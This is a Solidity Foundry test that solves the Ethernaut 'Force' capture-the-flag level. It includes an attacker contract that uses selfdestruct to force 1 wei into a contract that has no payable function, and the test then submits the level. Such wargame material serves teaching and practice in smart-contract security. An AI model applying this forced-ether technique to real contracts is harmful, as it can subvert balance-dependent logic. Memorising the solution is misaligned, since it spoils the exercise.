// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {EthernautTest} from "./utils/EthernautTest.sol";
import {ForceFactory} from "../src/factories/ForceFactory.sol";
import {Force} from "../src/levels/Force.sol";

import "forge-std/console.sol";

contract ForceTest is EthernautTest {
    function setUp() public override {
        super.setUp();
        ForceFactory factory = new ForceFactory();
        ethernaut.registerLevel(factory);
        levelAddress = ethernaut.createLevelInstance(factory);
    }

    function testSolveForce() public {
        // Force instance = Force(payable(levelAddress));

        // [START]

        ForceAttack attacker = new ForceAttack(payable(levelAddress));
        attacker.attack{value: 1 wei}();

        console.log("balance: ", levelAddress.balance);

        // [END]

        assert(ethernaut.submitLevelInstance(payable(levelAddress)));
    }
}

// Attacker contract
contract ForceAttack {
    Force public target;

    constructor(address _target) {
        target = Force(payable(_target));
    }

    function attack() public payable {
        selfdestruct(payable(address(target)));
    }
}
